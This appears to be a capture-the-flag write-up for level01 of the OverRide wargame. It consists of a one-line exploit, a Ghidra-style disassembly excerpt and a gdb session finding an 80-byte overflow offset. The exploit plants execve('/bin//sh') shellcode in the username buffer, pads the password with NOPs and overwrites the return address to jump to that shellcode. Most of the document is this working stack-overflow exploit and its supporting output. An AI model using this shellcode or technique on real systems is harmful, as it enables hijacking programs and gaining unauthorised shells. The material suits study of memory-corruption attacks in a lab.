```bash
cat <(python -c "print 'dat_wil' + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80' + '\n' + ('\x90' * 80) + '\x47\xa0\x04\x08'") - | ./level01
```

```bash
        08048503 b8 df 86        MOV        EAX,s_Enter_Username:_080486df                   = "Enter Username: "
                 04 08
        08048508 89 04 24        MOV        dword ptr [ESP]=>local_70,EAX=>s_Enter_Usernam   = "Enter Username: "
        0804850b e8 50 fe        CALL       <EXTERNAL>::printf                               int printf(char * __format, ...)
                 ff ff
        08048510 a1 20 a0        MOV        EAX,[stdin]
                 04 08
        08048515 89 44 24 08     MOV        dword ptr [ESP + local_68],EAX
        08048519 c7 44 24        MOV        dword ptr [ESP + local_6c],0x100
                 04 00 01 
                 00 00
        08048521 c7 04 24        MOV        dword ptr [ESP]=>local_70,a_user_name
                 40 a0 04 08
```

```bash
level01@OverRide:~$ gdb ./level01 
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/users/level01/level01...(no debugging symbols found)...done.
(gdb) r
Starting program: /home/users/level01/level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password: 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
nope, incorrect password...


Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? () // <---- offset de 80
(gdb) 
```